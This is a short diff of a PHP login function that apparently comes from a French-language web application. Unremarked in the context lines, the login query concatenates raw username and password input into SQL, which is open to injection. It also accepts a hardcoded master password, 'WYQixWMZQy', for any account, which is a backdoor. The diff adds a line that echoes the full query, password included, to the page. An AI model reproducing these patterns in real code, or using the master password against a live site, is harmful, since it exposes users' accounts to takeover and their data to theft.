@@ -16,6 +16,7 @@
 		." WHERE username LIKE '".JL::getVar('username', '', true)."' AND (password LIKE MD5('".JL::getVar('pass', '', true)."') OR 'WYQixWMZQy' = '".JL::getVar('pass', '', true)."') AND gid > 0 AND published = 1 AND id!=10114"
 		." LIMIT 0,1"
 		;
+		echo $query;
 		$user_id = $db->loadResult($query);
 		
 		if($user_id) {
@@ -58,7 +59,7 @@
 		}
 		
 		// met � jour le last_online de l'utilisateur
-		$query = "UPDATE user SET last_online = NOW(), ip = '".addslashes($_SERVER["REMOTE_ADDR"])."' WHERE id = '".$user->id."'";
+		$query = "UPDATE user SET last_online = NOW(), ip = '".addslashes((string) $_SERVER["REMOTE_ADDR"])."' WHERE id = '".$user->id."'";
 		
 		$db->query($query);
 		
